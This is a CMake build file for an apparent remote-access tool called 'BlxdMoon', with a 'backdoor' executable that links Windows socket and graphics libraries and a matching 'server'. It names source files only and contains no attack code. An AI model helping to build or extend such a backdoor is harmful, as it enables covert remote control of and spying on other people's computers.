cmake_minimum_required(VERSION 3.10)

project(BlxdMoon)

set(CMAKE_CXX_STANDARD 17)

include_directories(include)

add_executable(backdoor
    src/backdoor.c
    src/logger.c
    src/screen.c
    src/status.c
    src/str_cut.c
    src/uuid.c
    src/screen.c
)
add_executable(server
    src/server.c
    src/logger.c
    src/screen.c
    src/status.c
    src/str_cut.c
    src/uuid.c
    src/screen.c
)

target_link_libraries(backdoor ws2_32 gdi32)
target_link_libraries(server ws2_32)
